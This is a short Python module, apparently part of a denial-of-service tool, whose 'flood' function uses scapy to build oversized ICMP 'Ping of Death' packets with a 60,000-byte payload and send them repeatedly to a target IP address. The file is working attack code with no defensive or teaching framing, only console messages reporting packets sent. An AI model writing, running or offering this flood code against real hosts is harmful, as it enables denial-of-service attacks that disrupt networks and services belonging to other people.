# Import modules
import random
from scapy.all import IP, ICMP, send

from colorama import Fore

_LETTERS = list("1234567890qwertyuiopasdfghjklzxcvbnm")


def flood(target: tuple[str, int]) -> None:
    """Send Ping of Death packets to target.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    payload = random.choice(_LETTERS) * 60000
    packet = IP(dst=target[0]) / ICMP(id=65535, seq=65535) / payload

    for _ in range(4):
        try:
            send(packet, verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending PoD: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}PoD packet ({len(payload)} bytes) sent to {target[0]}{Fore.RESET}"
            )
